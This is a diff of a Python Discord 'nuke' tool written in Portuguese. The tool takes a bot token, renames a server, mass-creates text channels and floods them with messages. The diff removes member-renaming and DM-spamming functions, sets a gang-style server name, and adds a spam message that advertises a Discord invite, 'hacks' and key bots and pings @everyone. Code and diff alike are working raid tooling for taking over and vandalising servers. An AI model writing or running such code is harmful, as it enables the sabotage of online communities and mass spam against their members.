@@ -26,28 +26,6 @@ baner = f'''
 {r}╚═════╝     ╚═╝  ╚═╝
 {y}Feito por: {g}Menor dk'''
 
-async def rename_all_members(guild, prefix):
-    renamed = 0
-    for member in guild.members:
-        try:
-            new_nick = f'{prefix} ({member.name})'
-            await member.edit(nick=new_nick)
-            renamed += 1
-        except:
-            continue
-    return renamed
-
-async def send_direct_message(member, message):
-    try:
-        await member.send(message)
-    except:
-        pass
-
-async def notify_members(guild, message):
-    for member in guild.members:
-        if not any(permission in member.guild_permissions for permission in ['kick_members', 'ban_members']) and not any(role.permissions.administrator for role in member.roles):
-            await send_direct_message(member, message)
-
 async def create_text_channels_and_send_message(guild, name, message, stop_event):
     created = 0
     
@@ -70,19 +48,12 @@ async def nuke_guild(guild, name, message, stop_event):
     print(f'{r}Iniciando Nuke no servidor: {y}{guild.name}')
     
     # Renomeia o servidor
-    await guild.edit(name="T . C . C TERCEIRO COMANDO")
-    
-    # Notifica os membros via DM
-    await notify_members(guild, message)
-    
-    # Renomeia os membros
-    renamed = await rename_all_members(guild, '(T.C.C)')
+    await guild.edit(name="T . C . C TERCEIRO COMANDO DA CAPITAL 🇮🇶")
     
     # Cria canais de texto e envia mensagens
     created_text_channels = await create_text_channels_and_send_message(guild, name, message, stop_event)
     
     print(f'{g}Servidor {w}{guild.name}{g} atualizado com sucesso!')
-    print(f'{y}Membros renomeados: {g}{renamed}')
     print(f'{y}Canais de texto criados: {g}{created_text_channels}')
     print(f'{r}--------------------------------------------\n\n')
 
@@ -141,7 +112,14 @@ if __name__ == '__main__':
     
     token = _input(f'{y}Insira o token do bot:{g}')
     name = _input(f'{y}Insira o nome para os canais criados:{g}')
-    message = 'Mensagem para o canal de texto'
+    message = '''# DKZIN 🔥🥋🇾🇪
+> - TERCEIRO COMANDO DA CAPITAL NA ATIVA, ENTREM PRA TROPA E SEJAM FELIZES 👑
+- https://discord.com/invite/gZSx3n8Csa
+
+> TEMOS OTIMOS HACKS E METHODOS 
+> BOTS DE KEY E MUITO MAIS
+
+@here @everyone'''
     
     asyncio.run(main(token, name, message, stop_event))
     stop_thread.join()
